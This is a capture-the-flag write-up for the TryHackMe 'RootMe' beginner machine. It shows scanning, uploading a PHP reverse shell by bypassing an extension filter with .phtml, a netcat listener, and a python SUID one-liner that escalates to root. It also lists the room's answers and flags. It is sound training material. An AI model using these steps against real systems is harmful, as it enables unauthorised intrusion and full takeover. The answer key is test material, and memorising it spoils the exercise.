# RootMe Writeup

> Machine : Linux

> A ctf for beginners, can you root me?

## Solution

First let's connect to the machine.

> Deploy the machine
> 
> No answer needed

Then reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.128.142.126 -p- 
```

From our results, we can see ports 22 (SSH) and 80 (HTTP) are open.

> Scan the machine, how many ports are open?
> 
> 2

> What version of Apache is running?
> 
> 2.4.41

> What service is running on port 22?
> 
> SSH

After visiting the site on browser, we don't find anything interesting. So let's use `gobuster` to find if there is hidden directories.

```shell
gobuster dir -u http://10.128.142.126 -w /usr/share/wordlists/dirb/common.txt
```

> Find directories on the web server using the GoBuster tool.
> 
> No answer needed

After using `gobuster` we can find that there is two interesting directories `/uploads` where can we uploads files and `/panel` where can we see and execute the files that we uploads.

> What is the hidden directory?
> 
> /panel/

After that and because the site using `php` we can try upload `php payloads` trying to get a reverse shell.
With using https://www.revshells.com/ we can download and try a `php reverse shell`.

After trying we notice that the server is block `.php` extensions, so we try another php extension and we found that `.phtml` is allowed to upload.

```shell
nc -lvpn 4444
```

We have to listening using `netcat` after execute the `payload.phtml` file.

And we got a shell, now let's find the flag.

```shell
find / -type f -name user.txt 2>/dev/null
```

```text
/var/www/user.txt
```

```shell
cat /var/www/user.txt
```

```text
THM{y0u_g0t_a_sh3ll}
```

> user.txt
> 
> THM{y0u_g0t_a_sh3ll}

Now that we have a shell, let's escalate our privileges to root.

```shell
find / -perm -4000 -type f 2>/dev/null
```

From the output we can find that there is `/usr/bin/python` which we can use to gain root.

> Search for files with SUID permission, which file is weird?
> 
> /usr/bin/python

Using `GTFOBins`.

```shell
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

> Find a form to escalate your privileges.
> 
> No answer needed

Now as root we can find the last flag.

```shell
find / -type f -name root.txt 2>/dev/null
```

```text
/root/root.txt
```

```text
cat /root/root.txt
```

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

> root.txt
> 
> THM{pr1v1l3g3_3sc4l4t10n}

